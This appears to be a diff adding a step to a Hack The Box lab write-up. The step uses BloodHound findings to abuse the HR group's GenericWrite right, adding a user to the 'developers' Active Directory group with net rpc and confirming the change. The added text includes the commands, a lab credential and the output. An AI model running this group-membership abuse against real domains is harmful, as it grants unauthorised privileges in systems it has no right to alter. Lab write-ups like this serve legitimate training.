@@ -125,4 +125,25 @@ In Bloodhound, we perform an analysis of Group Delegated Object Control on the l
 
 <img src="images/01-hr-developers.png" width="500">
 
+As shown above, we inherit the permissions of the HR group, which has GenericWrite privileges over the developers group. The Linux abuse information tells us that we can add a user to the developers group, like so:
 
+#### Run net rpc:
+
+```
+net rpc group addmem "developers" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "10.129.232.75"
+```
+
+#### Check group members:
+
+```
+net rpc group members "developers" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "10.129.232.75"
+```
+
+#### Output:
+
+```
+PUPPY\levi.james
+PUPPY\ant.edwards
+PUPPY\adam.silver
+PUPPY\jamie.williams
+```
